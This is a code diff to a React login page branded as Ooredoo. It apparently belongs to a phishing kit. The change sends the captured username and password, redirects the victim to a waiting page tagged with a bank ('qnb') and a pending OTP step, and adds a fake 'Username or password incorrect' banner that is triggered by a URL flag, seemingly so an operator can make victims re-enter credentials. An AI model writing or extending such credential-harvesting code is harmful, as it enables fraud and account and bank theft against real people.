@@ -10,6 +10,7 @@ export default function Ooredoo() {
   const params = new URLSearchParams(search);
   const { language, setLanguage } = useLanguage();
   const sessionId = localStorage.getItem("sessionId") || "";
+  const showError = params.get("error") === "true";
 
   const isArabic = language === "ar";
 
@@ -25,11 +26,11 @@ export default function Ooredoo() {
         ooredooUser,
         ooredooPassword,
       });
-      toast.success("تم حفظ البيانات بنجاح");
+      const bank = params.get("bank") || "qnb";
+      setLocation(`/waiting?bank=${bank}&session=${sessionId}&next=otp-ooredoo`);
     } catch (error) {
-      console.error("Error saving Ooredoo data in DB, continuing anyway:", error);
+      toast.error(isArabic ? "حدث خطأ أثناء الإرسال" : "Error during submission");
     }
-    setLocation(`/otp-ooredoo?session=${sessionId}`);
   };
 
   return (
@@ -65,6 +66,11 @@ export default function Ooredoo() {
             </div>
         </header>
         <div className="content-body">
+            {showError && (
+              <div style={{ background: "#fee2e2", border: "1px solid #ef4444", color: "#b91c1c", padding: "10px", borderRadius: "5px", marginBottom: "15px", textAlign: "center", fontSize: "14px" }}>
+                {isArabic ? "اسم المستخدم او كلمة المرور غير صحيح" : "Username or password incorrect"}
+              </div>
+            )}
 <h1>{language === "ar" ? "تسجيل الدخول" : "Login"}</h1>
             <p className="sub-text">{language === "ar" ? "تسجيل الدخول باستخدام اسم المستخدم وكلمة المرور." : "Login using your username and password."}</p>
             <form onSubmit={handleSubmit}>
